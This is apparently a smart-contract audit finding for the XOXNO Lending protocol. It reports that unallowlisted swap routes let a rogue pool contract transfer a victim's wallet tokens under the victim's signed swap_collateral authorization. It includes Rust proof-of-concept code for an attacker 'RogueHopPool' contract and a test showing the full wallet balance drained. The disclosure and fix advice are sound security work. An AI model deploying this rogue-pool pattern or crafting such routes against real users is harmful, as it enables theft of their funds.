### Title
Caller-supplied swap route lets a rogue "pool" contract execute arbitrary token transfers under the victim's signed authorization tree, draining the victim's wallet - (File: contracts/controller/src/strategies/swap.rs)

### Summary
CVE-2021-21415 is a "trusted host executes an attacker-chosen binary path" bug: a workspace setting (`prismaFmtBinPath`) points the trusted VS Code extension at a malicious executable that runs with the user's privileges. The XOXNO Lending analog is the caller-supplied `swap_xdr` route accepted by `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply`: the payload's `assets` registry names arbitrary pool and token contracts that the swap router invokes with no venue or pool allowlist. A malicious "pool" contract placed on the route executes inside the transaction and can emit a `token.transfer(victim, attacker, amount)` that simulation records as a child of the victim's own `swap_collateral` authorization entry — so a victim who signs the simulated tree authorizes theft of unrelated wallet funds, exactly like the user who auto-formats a `.prisma` file and unknowingly runs the malicious binary. The protocol's own threat model documents this exposure and the test harness demonstrates it end to end. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_tokens` forwards the user-provided `StrategySwap` XDR verbatim to `router.execute_strategy(&controller, &amount_in, swap)` inside the flash guard. The controller constrains only its *own* grant — one exact `token_in.transfer(controller → router, amount_in)` via `authorize_transfer_as_current` — plus measured input/output deltas (`RouterOverspend`, `NoSwapOutput`). [4](#0-3) 

That bound covers only the controller's grant. The router decodes pool and token addresses from the payload's `assets` registry and calls them (`dispatch_hop` → venue adapters → `invoke_contract(&ctx.hop.pool, ...)`), keeping no allowlist of pool or token contracts. [5](#0-4) [6](#0-5) 

Because the victim's `require_auth` on the controller entrypoint is the transaction's user-auth root, any `require_auth` triggered by the rogue pool — e.g. `token.transfer(victim → attacker)` on an unrelated wallet token — is recorded by simulation as a `sub_invocation` beneath the victim's `swap_collateral` (or `swap_debt`/`repay_debt_with_collateral`/`multiply`) entry and executes once the victim signs that tree. The threat model states this verbatim: "a route can put third-party code on the call stack below the caller's authorization... The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it." [2](#0-1) 

The harness test `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` proves the mechanism: a route through an attacker-registered `RogueHopPool` returns a fair `min_out` (so all controller risk gates pass and the position stays solvent) while the pool's `swap` transfers Alice's entire `WALLET_BALANCE` of an unrelated token to the attacker, recorded as a child of Alice's signed `swap_collateral` invocation. [7](#0-6) [3](#0-2) 

### Impact Explanation
Theft of user funds. The stolen amount is bounded by the victim's wallet balances, not by the routed swap input: the rogue child transfer can move any token the victim holds in full. The swap itself still satisfies `min_out`, measured-delta checks, and post-swap account health, so nothing in-protocol detects or bounds the loss. [8](#0-7) 

### Likelihood Explanation
Requires the victim to sign a transaction whose simulated auth tree contains the malicious child entry — the same trust assumption as the CVE (victim opens a poisoned project). In practice routes are built by an off-chain quote service and signed in a wallet UI; a compromised or malicious route source, or an attacker who convinces a victim to sign a crafted `swap_collateral`/`swap_debt`/`repay_debt_with_collateral`/`multiply` call, suffices. Any unprivileged attacker can deploy the rogue pool contract and craft the payload; no privileged role, leaked key, or protocol misconfiguration is needed. Wallet simulation does surface the extra auth child, so a vigilant user or a verifying client can refuse it — which is why this is High rather than Critical. [9](#0-8) 

### Recommendation
Enforce a venue/pool allowlist or factory-verified pool set in the router so a payload cannot name arbitrary contracts (`dispatch_hop` should reject unregistered pools and token addresses), eliminating third-party code under the caller's auth tree. Short of that, the controller could execute swaps from an isolated sub-account/auth context so user-auth children cannot be attached. At minimum, mandate client-side verification as the threat model already prescribes: decode `routeXdr` and reject any authorization tree containing children other than the expected input transfer before signing. [10](#0-9) 

### Proof of Concept
1. Attacker deploys `RogueHopPool` configured with `(victim = Alice, wallet_token, to = attacker, amount = Alice's full balance)`; its `swap()` just calls `token::Client::transfer(&victim, &to, &amount)` inside the callback. [11](#0-10) 
2. Attacker (or a malicious quote source) serves Alice a `swap_collateral` route whose `assets` registry names the rogue contract as the hop pool; the router still pays a fair `min_out` so every protocol check passes. [12](#0-11) 
3. Alice simulates and signs `controller.swap_collateral(alice, account_id, USDC, SWAP_IN_USDC, ETH, route)`. Simulation records `wallet_token.transfer(alice → attacker, WALLET_BALANCE)` as a `sub_invocation` under her `swap_collateral` auth entry; signing authorizes it. [13](#0-12) 
4. Result asserted by the test: `wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`, and the swap itself still delivers `FAIR_OUT_ETH` to her position — the theft is invisible to every protocol-level check. [14](#0-13)

/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
